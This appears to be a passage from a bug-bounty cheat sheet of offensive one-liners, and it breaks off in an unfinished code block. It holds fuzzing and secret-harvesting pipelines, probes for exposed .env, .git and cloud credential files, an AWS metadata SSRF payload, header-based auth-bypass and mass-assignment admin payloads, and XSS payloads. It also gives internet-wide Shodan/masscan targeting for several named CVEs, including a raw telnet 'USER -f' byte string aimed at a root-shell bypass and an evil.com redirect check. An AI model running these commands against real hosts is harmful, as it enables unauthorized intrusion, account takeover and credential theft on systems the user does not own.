feroxbuster -u https://target.com -w wordlist.txt -d 5 --extract-links --collect-words --collect-backups -x php,html,js,json -t 50 -o ferox_extracted.txt
```

### 💀 Feroxbuster Resume + Filter by Size
```bash
# ☠️ Smart filtering by response size and resumable state
feroxbuster -u https://target.com -w wordlist.txt -d 4 -S 0 -W 1 --filter-status 404,500 --filter-words 20 --filter-lines 5 --resume-from ferox_state.json --state-file ferox_state.json -o ferox_filtered.txt
```

### 💀 Feroxbuster API Endpoints Discovery
```bash
# ☠️ Recursive API fuzzing with JSON content-type
feroxbuster -u https://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -d 3 -x json -t 50 -H "Accept: application/json" -H "Content-Type: application/json" --dont-extract-links -m GET,POST -o ferox_api.txt
```

### Git Exposure
```bash
cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]" | anew git_exposed.txt
```

### Sensitive Files
```bash
cat urls.txt | httpx -silent -path /.env,/config.php,/wp-config.php.bak,/.htaccess,/server-status -mc 200 | anew sensitive.txt
```

### Backup Files
```bash
cat urls.txt | sed 's/$/.bak/' | httpx -silent -mc 200 && cat urls.txt | sed 's/$/.old/' | httpx -silent -mc 200
```

### API Documentation
```bash
cat urls.txt | httpx -silent -path /swagger.json,/openapi.json,/api-docs,/swagger-ui.html -mc 200 | anew api_docs.txt
```

### Source Code Leak
```bash
cat urls.txt | httpx -silent -path /.svn/entries,/.bzr/README,/CVS/Root -mc 200 | anew vcs_exposed.txt
```

### Config Files
```bash
cat alive.txt | httpx -silent -path /config.json,/config.yaml,/config.yml,/settings.json,/app.config -mc 200 | anew configs.txt
```

### Database Files
```bash
cat alive.txt | httpx -silent -path /database.sql,/db.sql,/backup.sql,/dump.sql -mc 200 | anew db_files.txt
```

---

## ⚡ Nuclei Scanning

### Full Template Scan
```bash
nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high,medium -c 50 -rl 150 -o nuclei_results.txt
```

### CVE Scanning
```bash
nuclei -l alive.txt -t cves/ -severity critical,high -c 30 -o cve_results.txt
```

### Subdomain Takeover
```bash
subfinder -d target.com -silent | httpx -silent | nuclei -t takeovers/ -c 50
```

### Exposed Panels
```bash
nuclei -l alive.txt -t exposed-panels/ -c 50 | anew panels.txt
```

### Misconfigurations
```bash
nuclei -l alive.txt -t misconfiguration/ -severity high,critical | anew misconfig.txt
```

### DAST Mode
```bash
nuclei -l urls.txt -dast -rl 10 -c 3 -o dast_results.txt
```

### Custom Tags
```bash
nuclei -l alive.txt -tags cve,rce,sqli,xss -severity critical,high -o tagged_results.txt
```

### Network Scanning
```bash
nuclei -l ips.txt -t network/ -c 25 -o network_vulns.txt
```

---

## 🔌 API Security Testing

### GraphQL Introspection
```bash
cat urls.txt | httpx -silent -path /graphql -mc 200 | xargs -I@ curl -s @ -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | grep -v "error"
```

### REST API Enumeration
```bash
cat alive.txt | httpx -silent -path /api/v1,/api/v2,/api/v3,/api/swagger.json -mc 200 | anew api_endpoints.txt
```

### JWT Analysis
```bash
cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
```

### API Key Leakage
```bash
cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oiE "(api[_-]?key|apikey|api_secret)[=:]['\"]?[a-zA-Z0-9]{16,}['\"]?" | anew api_keys.txt
```

### Broken Authentication
```bash
# Test endpoints without auth
cat api_endpoints.txt | httpx -silent -mc 200 -fc 401,403 | anew no_auth_endpoints.txt
```

### Rate Limiting Test
```bash
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/api/endpoint"; done | sort | uniq -c
```

### BOLA/IDOR Testing
```bash
cat urls.txt | grep -oE "(id|user_id|account_id|uid)=[0-9]+" | sed 's/=[0-9]*/=FUZZ/' | sort -u | anew bola_candidates.txt
```

### 💀 API Endpoint Fuzzing with ffuf
```bash
# ☠️ Fuzz API endpoints with common paths and methods
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405 -ac -c -t 100 -H "Content-Type: application/json" -o api_fuzz.json -of json
```

### 💀 API Version Fuzzing
```bash
# ☠️ Discover hidden API versions
ffuf -u https://target.com/api/vFUZZ/users -w <(seq 1 20) -mc 200,201,401,403 -ac -c && ffuf -u https://target.com/FUZZ/users -w <(echo -e "api\nv1\nv2\nv3\nv4\napi/v1\napi/v2\napi/v3\napi/internal\napi/private\napi/admin\napi/dev\napi/test\napi/staging\napi/beta") -mc 200,201,401,403 -ac -c
```

### 💀 REST API Methods Fuzzing
```bash
# ☠️ Test all HTTP methods on API endpoints
cat api_endpoints.txt | while read url; do for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$url" -H "Content-Type: application/json"); echo "$method $url - $CODE"; done; done | grep -vE " - (404|405)$" | anew api_methods.txt
```

### 💀 GraphQL Fuzzing with ffuf
```bash
# ☠️ Fuzz GraphQL endpoints for introspection and queries
ffuf -u https://target.com/FUZZ -w <(echo -e "graphql\ngraphiql\nplayground\nconsole\nquery\ngql\nv1/graphql\nv2/graphql\napi/graphql\napi/gql") -mc 200,400 -ac -c -H "Content-Type: application/json" -d '{"query":"{__typename}"}' -X POST -o graphql_endpoints.json
```

### 💀 API Parameter Fuzzing
```bash
# ☠️ Discover hidden API parameters with arjun + ffuf combo
cat api_endpoints.txt | xargs -I@ -P5 arjun -u @ -m POST -oT arjun_params.txt && cat api_endpoints.txt | xargs -I@ ffuf -u @?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,201,400,500 -ac -c -t 50 -o param_fuzz.json
```

### 💀 API Authentication Bypass Fuzzing
```bash
# ☠️ Test auth bypass techniques on protected endpoints
cat api_endpoints.txt | while read url; do curl -s -o /dev/null -w "%{http_code} - $url\n" "$url" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"; done | grep "^200" | anew auth_bypass.txt
```

### 💀 OpenAPI/Swagger Fuzzing
```bash
# ☠️ Find and extract endpoints from OpenAPI specs
ffuf -u https://target.com/FUZZ -w <(echo -e "swagger.json\nswagger.yaml\nopenapi.json\nopenapi.yaml\napi-docs\napi-docs.json\nswagger-ui.html\nswagger/v1/swagger.json\nv1/swagger.json\nv2/swagger.json\nv3/swagger.json\napi/swagger.json\ndocs/api\napi/docs") -mc 200 -ac -c | tee swagger_found.txt | xargs -I@ curl -s @ | jq -r '.paths | keys[]' 2>/dev/null | anew swagger_paths.txt
```

### 💀 API JSON Fuzzing with Nuclei
```bash
# ☠️ Mass API fuzzing with nuclei DAST mode
cat api_endpoints.txt | httpx -silent -mc 200,201,401,403 | nuclei -dast -t dast/vulnerabilities/ -H "Content-Type: application/json" -rl 20 -c 5 -o api_nuclei_dast.txt
```

### 💀 API Mass Assignment Fuzzing
```bash
# ☠️ Test for mass assignment vulnerabilities
cat api_endpoints.txt | grep -iE "(user|account|profile|register|signup|update)" | xargs -I@ curl -s -X POST @ -H "Content-Type: application/json" -d '{"admin":true,"role":"admin","isAdmin":true,"is_admin":1,"privilege":"admin","access_level":9999}' -o /dev/null -w "%{http_code} - @\n" | grep -E "^(200|201|204)" | anew mass_assignment.txt
```

### 💀 API FUZZ with Custom Wordlist Generation
```bash
# ☠️ Generate API wordlist from JS files and fuzz
cat js.txt | xargs -I@ curl -s @ | grep -oE "[\"\']/(api|v[0-9])/[a-zA-Z0-9/_-]+[\"\']" | tr -d "\"'" | sort -u > custom_api_wordlist.txt && ffuf -u https://target.com/FUZZ -w custom_api_wordlist.txt -mc 200,201,204,401,403,500 -ac -c -t 80 -H "Authorization: Bearer null" -o custom_api_fuzz.json
```

---

## ☁️ Cloud Security

### AWS S3 Bucket Finder
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com" | anew s3_buckets.txt
cat urls.txt | grep -oE "s3://[a-zA-Z0-9.-]+" | anew s3_buckets.txt
```

### S3 Permission Check
```bash
cat s3_buckets.txt | xargs -I@ sh -c 'aws s3 ls s3://@ --no-sign-request 2>/dev/null && echo "OPEN: @"'
```

### Firebase Database
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.firebaseio\.com" | xargs -I@ curl -s @/.json | grep -v "null"
```

### Azure Blob Storage
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.blob\.core\.windows\.net" | anew azure_blobs.txt
```

### GCP Storage
```bash
cat urls.txt | grep -oE "storage\.googleapis\.com/[a-zA-Z0-9-]+" | anew gcp_buckets.txt
```

### AWS Metadata SSRF
```bash
cat urls.txt | gf ssrf | qsreplace "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | httpx -silent -ms "AccessKeyId"
```

### Cloud Credential Files
```bash
cat alive.txt | httpx -silent -path /.aws/credentials,/.docker/config.json,/kubeconfig -mc 200 | anew cloud_creds.txt
```

---

## 🤖 Automation Scripts

### Full Recon Pipeline
```bash
#!/bin/bash
domain=$1
mkdir -p $domain && cd $domain

# Subdomains
subfinder -d $domain -all -silent | anew subs.txt
amass enum -passive -d $domain | anew subs.txt
assetfinder -subs-only $domain | anew subs.txt

# Alive check
cat subs.txt | httpx -silent -threads 100 | anew alive.txt

# URLs
cat alive.txt | katana -d 5 -jc -silent | anew urls.txt
cat alive.txt | waybackurls | anew urls.txt
cat alive.txt | gau --threads 50 | anew urls.txt

# Vulnerability patterns
cat urls.txt | gf xss | anew xss.txt
cat urls.txt | gf sqli | anew sqli.txt
cat urls.txt | gf ssrf | anew ssrf.txt
cat urls.txt | gf lfi | anew lfi.txt

# Nuclei scan
nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
```

### XSS Hunter Script
```bash
#!/bin/bash
target=$1
echo $target | waybackurls | anew urls.txt
echo $target | gau | anew urls.txt
cat urls.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1)>' | airixss -payload "alert(1)" | tee xss_found.txt
cat urls.txt | gf xss | uro | dalfox pipe --silence | tee -a xss_found.txt
```

### API Recon Script
```bash
#!/bin/bash
target=$1
mkdir -p $target/api && cd $target/api

# Find API endpoints
cat ../alive.txt | httpx -silent -path /api,/api/v1,/api/v2,/swagger.json,/openapi.json | anew api_endpoints.txt

# Extract from JS
cat ../js.txt | xargs -I@ curl -s @ | grep -oE "(/api/[^\"\'\`\s\<\>]+)" | sort -u | anew js_api_endpoints.txt

# Test GraphQL
cat ../alive.txt | httpx -silent -path /graphql,/graphiql,/playground -mc 200 | anew graphql.txt

echo "[+] API recon complete!"
```

---

## ⚙️ Bash Functions

Add to your `.bashrc` or `.zshrc`:

```bash
# Quick recon
recon() {
    subfinder -d $1 -silent | anew subs.txt
    assetfinder -subs-only $1 | anew subs.txt
    cat subs.txt | httpx -silent | anew alive.txt
    echo "[+] Found $(wc -l < alive.txt) alive hosts"
}

# XSS scan
xscan() {
    echo $1 | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
}

# SQLi scan
sqscan() {
    echo $1 | waybackurls | gf sqli | uro | qsreplace "'" | httpx -silent -ms "error|syntax|mysql"
}

# JS recon
jsrecon() {
    echo $1 | waybackurls | grep -iE "\.js$" | httpx -silent | nuclei -t exposures/
}

# Nuclei quick
nuke() {
    echo $1 | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high
}

# Full pipeline
fullrecon() {
    recon $1
    cat alive.txt | katana -d 3 -jc -silent | anew urls.txt
    cat urls.txt | gf xss | anew xss.txt
    cat urls.txt | gf sqli | anew sqli.txt
    nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
}

# Certificate search
cert() {
    curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
}

# Parameter extraction
params() {
    echo $1 | waybackurls | grep "=" | uro | unfurl keys | sort -u
}

# Subdomain takeover check
takeover() {
    subfinder -d $1 -silent | httpx -silent | nuclei -t takeovers/ -c 50
}

# Port scan
portscan() {
    naabu -host $1 -top-ports 1000 -silent | httpx -silent | anew $1_ports.txt
}

# Screenshot all
screenshot() {
    cat $1 | xargs -I@ gowitness single @ -o screenshots/
}
```

---

## 🆕 New Oneliners 2026

### ⚡🔥⚡ TelnetPwn - CVE-2026-24061 (CVSS 9.8 - CRITICAL) ⚡🔥⚡

> **💀 GNU InetUtils Telnetd Authentication Bypass - Instant Root Shell! Under Active Exploitation! 💀**

#### ⚡ 1. Shodan Mass Telnet Discovery
```bash
# 💀 Find exposed telnet servers worldwide
shodan search "port:23 telnet" --fields ip_str,port,org | awk '{print $1":"$2}' | anew telnet_targets.txt
```

#### ⚡ 2. Nmap Telnet Service Detection + Version
```bash
# 💀 Enumerate telnet services with version detection
nmap -p23 -sV --script=telnet-ntlm-info -iL targets.txt -oG - | grep "23/open" | awk '{print $2}' | anew telnet_open.txt
```

#### ⚡ 3. Masscan Fast Telnet Sweep
```bash
# 💀 Ultra-fast telnet port discovery on large ranges
masscan -p23 --rate=10000 -iL ip_ranges.txt -oG masscan_telnet.txt && cat masscan_telnet.txt | grep "23/open" | awk '{print $4}' | anew telnet_alive.txt
```

#### ⚡ 4. GNU InetUtils Telnetd Fingerprint
```bash
# 💀 Identify GNU inetutils-telnetd specifically (vulnerable)
cat telnet_targets.txt | xargs -P30 -I@ sh -c 'echo "" | timeout 3 nc -v @ 23 2>&1 | grep -qi "GNU\|inetutils\|Ubuntu\|Debian" && echo "[GNU TELNETD] @"' | tee gnu_telnetd.txt
```

#### ⚡ 5. CVE-2026-24061 Vulnerability Check (Safe)
```bash
# 💀 Test for NEW_ENVIRON option support (vuln indicator)
cat telnet_targets.txt | xargs -P20 -I@ sh -c 'echo -e "\xff\xfa\x27\x00\x00USER\x01-f\xff\xf0" | timeout 3 nc @ 23 2>/dev/null | grep -q "login\|root\|#" && echo "[CVE-2026-24061 POTENTIAL] @"' | tee cve_2026_24061_potential.txt
```

#### ⚡ 6. Nuclei CVE-2026-24061 Scanner
```bash
# 💀 Mass scan with Nuclei template
cat telnet_targets.txt | nuclei -t http/cves/2026/CVE-2026-24061.yaml -c 50 -o cve_2026_24061_vuln.txt
```

#### ⚡ 7. Banner Grabbing + Version Extraction
```bash
# 💀 Extract telnet banners for version analysis
cat telnet_targets.txt | xargs -P50 -I@ sh -c 'echo "" | timeout 3 nc @ 23 2>&1 | head -3' | tee telnet_banners.txt | grep -iE "(inetutils|GNU|2\.[0-7])" | anew potentially_vuln_versions.txt
```

#### ⚡ 8. Subnet Telnet Hunter
```bash
# 💀 Discover telnet in internal/external subnets
prips 192.168.0.0/16 | xargs -P100 -I@ sh -c 'timeout 1 nc -zv @ 23 2>&1 | grep -q "succeeded\|open" && echo @' | anew internal_telnet.txt
```

#### ⚡ 9. Telnet + OS Fingerprint Correlation
```bash
# 💀 Correlate telnet with vulnerable OS (Debian/Ubuntu/Kali)
nmap -p23 -sV -O --script=telnet-encryption -iL telnet_targets.txt -oX telnet_scan.xml && cat telnet_scan.xml | grep -oE "(Debian|Ubuntu|Kali|Linux)" | sort | uniq -c | sort -rn
```

#### ⚡ 10. Full CVE-2026-24061 Recon Pipeline
```bash
# 💀 Complete telnet vulnerability assessment pipeline
TARGET_RANGE="192.168.1.0/24"; mkdir -p telnet_recon && cd telnet_recon; masscan -p23 --rate=5000 $TARGET_RANGE -oG masscan.txt; cat masscan.txt | grep "23/open" | awk '{print $4}' > telnet_hosts.txt; cat telnet_hosts.txt | xargs -P30 -I@ sh -c 'echo "" | timeout 3 nc @ 23 2>&1 | head -5' > banners.txt; grep -liE "(GNU|inetutils|ubuntu|debian)" banners.txt | xargs -I@ basename @ .txt > gnu_telnetd_hosts.txt; echo "[+] Found $(wc -l < telnet_hosts.txt) telnet | $(wc -l < gnu_telnetd_hosts.txt) GNU inetutils (potentially vulnerable)"
```

> **⚠️ Affected:** GNU InetUtils telnetd 1.9.3 - 2.7 (Debian/Ubuntu/Kali/Trisquel)
> **✅ Fix:** Update to GNU InetUtils 2.8+ or disable telnetd and use SSH

---

### ⚡🔥⚡ Ni8mare - CVE-2026-21858 (CVSS 10.0 - CRITICAL) ⚡🔥⚡

> **💀 Critical Unauthenticated RCE in n8n Workflow Automation - 100,000+ servers affected! Added to CISA KEV 💀**

#### ⚡ Detect n8n Instances (Shodan/Censys)
```bash
shodan search "n8n" --fields ip_str,port,hostnames | awk '{print "https://"$1":"$2}' | httpx -silent | anew n8n_targets.txt
```

#### ⚡ Fingerprint n8n Installations
```bash
cat alive.txt | httpx -silent -match-string "n8n" -match-string "workflow" -title | grep -i "n8n" | anew n8n_instances.txt
```

#### ⚡ Check Vulnerable Webhook Endpoints
```bash
cat n8n_targets.txt | xargs -I@ -P20 sh -c 'curl -s -o /dev/null -w "%{http_code}" -X POST @/webhook-test/test -H "Content-Type: multipart/form-data" 2>/dev/null | grep -qE "^(200|400|500)$" && echo "POTENTIAL: @"' | tee n8n_webhook_check.txt
```

#### ⚡ Content-Type Confusion Detection
```bash
curl -s -X POST "https://target.com/webhook/ID" -H "Content-Type: application/json" --data '{"test":1}' -w "\n%{http_code}" | tail -1 | grep -qE "^(200|400)$" && echo "Webhook accepts requests"
```

#### ⚡ Mass n8n Version Detection
```bash
cat n8n_targets.txt | httpx -silent -path /rest/settings -match-regex '"versionCli":"[0-9]+\.[0-9]+\.[0-9]+"' | anew n8n_versions.txt
```

#### ⚡ Nuclei Template Check for CVE-2026-21858
```bash
nuclei -l n8n_targets.txt -t http/cves/2026/CVE-2026-21858.yaml -c 30 -o ni8mare_vuln.txt
```

> **⚠️ Affected:** n8n < 1.121.0 | **✅ Fix:** Update to n8n 1.121.0+

---

### ⚡🔥⚡ N8n Auth RCE - CVE-2026-21877 (CVSS 10.0 - CRITICAL) ⚡🔥⚡

> **💀 Authenticated RCE via Git Node in n8n - Cloud & Self-hosted affected! 💀**

#### ⚡ Detect Git Node Enabled Instances
```bash
cat n8n_targets.txt | httpx -silent -path /rest/node-types -match-string "git" | anew n8n_git_enabled.txt
```

#### ⚡ Check n8n Authentication Endpoints
```bash
cat n8n_targets.txt | httpx -silent -path /rest/login -mc 200,401 -title | anew n8n_auth_endpoints.txt
```

> **⚠️ Affected:** n8n < 1.121.3 | **✅ Fix:** Update to n8n 1.121.3+

---

### ⚡🔥⚡ D-Link DSL RCE - CVE-2026-0625 (CVSS 9.3 - CRITICAL) ⚡🔥⚡

> **💀 Command Injection in Legacy D-Link DSL Routers - Under active exploitation! 💀**

#### ⚡ Shodan Dork for D-Link DSL Routers
```bash
shodan search "D-Link DSL" --fields ip_str,port | awk '{print $1":"$2}' | httpx -silent | anew dlink_dsl_targets.txt
```

#### ⚡ Detect Vulnerable dnscfg.cgi Endpoint
```bash
cat dlink_dsl_targets.txt | httpx -silent -path /dnscfg.cgi -mc 200,401 | anew dlink_dnscfg.txt
```

#### ⚡ Mass D-Link Fingerprint
```bash
cat alive.txt | httpx -silent -match-string "D-Link" -match-string "DSL" -title -tech-detect | anew dlink_routers.txt
```

> **⚠️ Affected:** Legacy D-Link DSL Gateway Routers (EOL) | **✅ Fix:** Replace with supported devices

---

### ⚡🔥⚡ Veeam Backup RCE - CVE-2025-59470 (CVSS 9.0 - CRITICAL) ⚡🔥⚡

> **💀 RCE via Postgres Parameter Injection in Veeam Backup & Replication 💀**

#### ⚡ Detect Veeam Backup Servers
```bash
shodan search "Veeam" --fields ip_str,port | awk '{print "https://"$1":"$2}' | httpx -silent | anew veeam_targets.txt
```

#### ⚡ Fingerprint Veeam Instances
```bash
cat alive.txt | httpx -silent -match-string "Veeam" -title -tech-detect | grep -i "veeam" | anew veeam_instances.txt
```

> **⚠️ Affected:** Veeam B&R 13.0.1.180 and earlier | **✅ Fix:** Update to 13.0.1.1071+

---

### ⚡🔥⚡ Grafana Ghost XSS - CVE-2025-4123 (HIGH SEVERITY) ⚡🔥⚡

> **💀 Zero-Day XSS in Grafana - 46,500+ instances still vulnerable! Account Takeover possible 💀**

#### ⚡ Find Grafana Instances
```bash
shodan search "Grafana" --fields ip_str,port,hostnames | awk '{print "https://"$1":"$2}' | httpx -silent | anew grafana_targets.txt
```

#### ⚡ Detect Grafana Version
```bash
cat grafana_targets.txt | httpx -silent -path /api/frontend/settings -match-regex '"version":"[0-9]+\.[0-9]+\.[0-9]+"' | anew grafana_versions.txt
```

#### ⚡ Check Open Redirect (CVE-2025-4123 vector)
```bash
cat grafana_targets.txt | xargs -I@ sh -c 'curl -sI "@/login?redirect=//" 2>/dev/null | grep -i "location" && echo "CHECK: @"' | tee grafana_redirect_check.txt
```

#### ⚡ Mass Grafana Login Page Detection
```bash
cat alive.txt | httpx -silent -path /login -match-string "Grafana" -title | anew grafana_logins.txt
```

> **⚠️ Affected:** Multiple Grafana versions | **✅ Fix:** Update to latest patched version

---

### ⚡🔥⚡ CVE-2026 Subdomain Hunting - Mass Detection Pipeline ⚡🔥⚡

> **💀 10 Oneliners to hunt CVE-2026 vulnerabilities across subdomains at scale! 💀**

#### ⚡ 1. Full Subdomain CVE-2026 Hunt Pipeline (n8n + Grafana + D-Link)
```bash
subfinder -d target.com -silent | httpx -silent -title -tech-detect | tee alive_subs.txt | while read line; do echo "$line" | grep -qiE "(n8n|grafana|d-link)" && echo "[CVE-2026 TARGET] $line"; done | anew cve2026_targets.txt
```

#### ⚡ 2. Mass n8n CVE-2026-21858 Detection on Subdomains
```bash
subfinder -d target.com -silent | httpx -silent | xargs -I@ -P30 sh -c 'curl -s "@/rest/settings" 2>/dev/null | grep -q "versionCli" && echo "[N8N FOUND] @"' | tee n8n_subs.txt | xargs -I@ nuclei -u @ -t http/cves/2026/CVE-2026-21858.yaml -silent
```

#### ⚡ 3. CVE-2026-21877 n8n Git Node RCE Subdomain Scanner
```bash
cat subdomains.txt | httpx -silent | xargs -I@ -P20 sh -c 'curl -s "@/rest/node-types" 2>/dev/null | grep -qi "git" && curl -s "@/rest/settings" 2>/dev/null | grep -qE "versionCli.*1\.(([0-9]|[0-9][0-9]|1[01][0-9]|120)\.[0-9]+)" && echo "[CVE-2026-21877 VULN] @"' | anew n8n_git_vuln.txt
```

#### ⚡ 4. Grafana CVE-2025-4123 XSS + Open Redirect Subdomain Hunt
```bash
subfinder -d target.com -silent | httpx -silent -path /api/frontend/settings -match-regex '"version":"' | tee grafana_subs.txt | xargs -I@ -P15 sh -c 'curl -sI "@/login?redirect=//evil.com" 2>/dev/null | grep -qi "location.*evil" && echo "[CVE-2025-4123 VULN] @"'
```

#### ⚡ 5. Multi-CVE-2026 Scanner with Nuclei (Parallel Templates)
```bash
subfinder -d target.com -silent | httpx -silent | nuclei -tags cve2026 -severity critical,high -c 50 -o cve2026_nuclei_results.txt
```

#### ⚡ 6. Subdomain n8n Webhook Fingerprint + CVE-2026-21858 Check
```bash
cat subdomains.txt | httpx -silent | xargs -I@ -P25 sh -c 'for path in /webhook /webhook-test /rest/workflows; do curl -s -o /dev/null -w "%{http_code}" "@$path" 2>/dev/null | grep -qE "^(200|401|403)$" && echo "[N8N ENDPOINT] @$path" && break; done' | anew n8n_webhooks.txt
```

#### ⚡ 7. CVE-2026 IoT/Router Hunt (D-Link DSL + Other Routers)
```bash
subfinder -d target.com -silent | httpx -silent -title -tech-detect | grep -iE "(d-link|router|gateway|modem|dsl)" | tee router_subs.txt | xargs -I@ -P10 sh -c 'curl -s "@/dnscfg.cgi" 2>/dev/null | grep -qi "dns" && echo "[CVE-2026-0625 POTENTIAL] @"'
```

#### ⚡ 8. Veeam CVE-2025-59470 Subdomain Detection
```bash
subfinder -d target.com -silent | httpx -silent -title -tech-detect | grep -i "veeam" | tee veeam_subs.txt | xargs -I@ -P10 sh -c 'curl -s "@/api/v1/version" 2>/dev/null | grep -qE "13\.0\.[01]\.[0-9]+" && echo "[CVE-2025-59470 VULN] @"'
```

#### ⚡ 9. Combined CVE-2026 Fingerprint + Version Extractor
```bash
subfinder -d target.com -silent | httpx -silent -json | jq -r 'select(.technologies != null) | "\(.url) \(.technologies[])"' | grep -iE "(n8n|grafana|veeam|next)" | while read url tech; do echo "[CVE-2026 CHECK] $url - $tech"; done | anew cve2026_tech_fingerprint.txt
```

#### ⚡ 10. Full CVE-2026 Recon Automation Script
```bash
domain="target.com"; mkdir -p recon_$domain && cd recon_$domain && subfinder -d $domain -silent | httpx -silent -title -tech-detect -json -o httpx_out.json && cat httpx_out.json | jq -r '.url' | nuclei -t ~/nuclei-templates/http/cves/2026/ -c 30 -o cve2026_vulns.txt && echo "[+] Found $(wc -l < cve2026_vulns.txt) CVE-2026 vulnerabilities!"
```

> **🎯 Pro Tip:** Combine with `notify` to get real-time alerts: `... | notify -silent -provider slack`

---

### ⚡🔥⚡ Advanced Reconnaissance Pipeline - 2026 Edition ⚡🔥⚡

> **🎯 10 Elite Oneliners for comprehensive reconnaissance - Multi-source enumeration, ASN discovery, JS analysis & more! 🎯**

#### ⚡ 1. Multi-Source Subdomain Discovery + Tech Fingerprinting
```bash
subfinder -d target.com -all -silent | anew subs.txt && assetfinder --subs-only target.com | anew subs.txt && amass enum -passive -norecursive -noalts -d target.com | anew subs.txt && cat subs.txt | httpx -silent -threads 200 -tech-detect -status-code -title -o alive_with_tech.txt
```
> Combines Subfinder + Assetfinder + Amass for maximum subdomain coverage, then validates with httpx + technology fingerprinting

#### ⚡ 2. ASN Enumeration + Reverse DNS Discovery
```bash
echo "target.com" | dnsx -silent -resp-only -a | xargs -I{} whois -h whois.cymru.com {} | awk '{print $1}' | grep -E "AS[0-9]+" | xargs -I{} sh -c 'whois -h whois.radb.net -- "-i origin {}" | grep -Eo "([0-9.]+){4}/[0-9]+"' | mapcidr -silent | dnsx -silent -ptr -resp-only | anew asn_discovered_hosts.txt
```
> Discovers ASN, enumerates IP blocks, performs reverse DNS to find hidden subdomains

#### ⚡ 3. URL Discovery Pipeline (Wayback + GAU + Katana)
```bash
cat alive.txt | xargs -P 50 -I{} sh -c 'echo {} | waybackurls & echo {} | gau --threads 10 --blacklist png,jpg,gif,svg,woff,ttf & echo {} | katana -d 3 -jc -kf all -silent' | uro | anew all_urls.txt
```
> Parallel URL collection from Wayback Machine, Common Crawl, AlienVault + active crawling with smart deduplication

#### ⚡ 4. JavaScript Deep Analysis + Secret Scanner
```bash
cat alive.txt | katana -silent -em js,json -jc -d 2 | httpx -silent -mc 200 | tee js_files.txt | xargs -P 20 -I{} sh -c 'curl -sk {} | tee /tmp/js_$$.tmp | grep -oE "(api_key|apikey|api-key|secret|token|password|aws_access|AKIA[0-9A-Z]{16})" && cat /tmp/js_$$.tmp | grep -oE "/(api|v[0-9]|admin|internal)/[a-zA-Z0-9_/?=&-]+" | sort -u' | anew js_secrets_and_endpoints.txt
```
> Finds JS files, extracts hardcoded secrets (API keys, tokens, AWS keys) and hidden API endpoints

#### ⚡ 5. Certificate Transparency + Subdomain Permutation Attack
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee crt_subs.txt | dnsgen - | shuffledns -d target.com -r /usr/share/wordlists/resolvers.txt -silent -o permuted_subs.txt && cat permuted_subs.txt | httpx -silent -o alive_permuted.txt
```
> CT logs enumeration + intelligent permutation (api → api-dev, api-staging) with mass DNS resolution

#### ⚡ 6. Port Discovery + Web Services on Non-Standard Ports
```bash
cat subs.txt | naabu -silent -top-ports 1000 -exclude-cdn -c 50 | sed 's/:/ /g' | awk '{print $1":"$2}' | httpx -silent -probe -status-code -title -tech-detect -follow-redirects -random-agent -o ports_with_web_services.txt
```
> Fast port scan + discovers web apps running on unusual ports (8080, 8443, 3000, etc)

#### ⚡ 7. GitHub Dorking Automation for Target Organization
```bash
ORG="target"; for dork in "org:$ORG password" "org:$ORG api_key" "org:$ORG secret" "org:$ORG token" "org:$ORG aws_access" "org:$ORG credentials"; do echo "[+] Searching: $dork"; gh search repos "$dork" --limit 100 | grep "^$ORG" | tee -a github_secrets.txt; sleep 2; done
```
> Automated GitHub dorking for secrets, credentials and sensitive data exposure

#### ⚡ 8. Cloud Storage Discovery (S3 + Azure + GCP)
```bash
cat all_urls.txt | grep -oE '(s3\.amazonaws\.com/[a-zA-Z0-9._-]+|[a-zA-Z0-9._-]+\.s3\.amazonaws\.com|storage\.googleapis\.com/[a-zA-Z0-9._-]+|[a-zA-Z0-9._-]+\.blob\.core\.windows\.net)' | sort -u | tee cloud_buckets.txt | xargs -I{} sh -c 'curl -sI https://{} | grep -q "200\|403" && echo "[+] {} - Accessible"'
```
> Extracts and validates misconfigured cloud storage buckets from collected URLs

#### ⚡ 9. Parameter Discovery + Vulnerability Pattern Matching
```bash
cat all_urls.txt | uro | grep "=" | unfurl keys | sort -u | tee all_params.txt && cat all_urls.txt | gf xss | tee xss_params.txt && cat all_urls.txt | gf ssrf | tee ssrf_params.txt && cat all_urls.txt | gf sqli | tee sqli_params.txt && cat all_urls.txt | gf redirect | tee redirect_params.txt
```
> Extracts unique parameters and categorizes by vulnerability type (XSS, SSRF, SQLi, Redirect)

#### ⚡ 10. Continuous Recon Monitor (Cron-Ready)
```bash
